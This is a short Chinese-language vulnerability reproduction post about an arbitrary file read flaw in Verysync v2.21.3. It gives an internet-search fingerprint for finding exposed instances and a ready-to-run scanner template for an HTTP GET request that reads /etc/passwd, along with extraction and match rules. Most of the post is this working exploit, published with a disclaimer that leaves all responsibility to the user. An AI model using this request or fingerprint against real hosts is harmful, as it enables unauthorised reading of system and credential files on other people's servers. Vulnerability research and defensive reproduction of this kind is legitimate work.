#  [漏洞复现]微力同步-Verysync任意文件读取漏洞(VEID-2026-11111)  
老谢
                    老谢  H4ll0 H4ck3r   2026-03-26 13:11  
  
```
声明: 由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，H4ll0 H4ck3r及文章作者不为此承担任何责任。
H4ll0 H4ck3r拥有对此文章的修改和解释权。如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经H4ll0 H4ck3r允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的。
```  
  
**漏洞描述**  
```
微力同步-Verysync任意文件读取漏洞
攻击者可进行任意文件读取,从而获得敏感信息。
```  
  
**影响版本**  
```
微力同步-Verysync | v2.21.3
```  
  
**空间测绘**  
```
body="Verysync"
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iaZeP7cJpWXN1vp6BC9egN3LdmpuRRaPWgtuHpO1tGS234x5ROBCicSI5j0yVMLZN8Swlv63wQLkxrvWcWGAhN0icGTRGsYwb7ckxhxgTY8NXM/640?wx_fmt=png&from=appmsg "")  
  
**本地漏洞环境复现**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iaZeP7cJpWXNZMrQbvhYY7pceX4kRwgicsTtGdicEmuKhz6m6tL0TgYJS8vY1QeHF3yibNO4KgMhfb2xFl2dRb6bNFXibu7YcRlswyEGLE6el9ao/640?wx_fmt=png&from=appmsg "")  
  
**Veil POC**  
```
GET /rest/f/api/resources/f96956469e7be39d/etc/passwd?override=false HTTP/1.1
Host: {{Hostname}}
User-Agent: {{random_ua}}

#@ condition: and
#> extract: name=path, from=body, json=$.path
#> extract: name=content, from=body, json=$.content
#@ matcher: status_code == 200
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaZeP7cJpWXOAquicHRFBMVZzLODhjU9h5ZxxhY0PNcBvxmFHx4wp7jDvOuUkdvt3NlCXJaY0GoqGWFEVoX7syKxcRTF7HyrEyrGW4kB4Z8Cc/640?wx_fmt=png&from=appmsg "")  
  
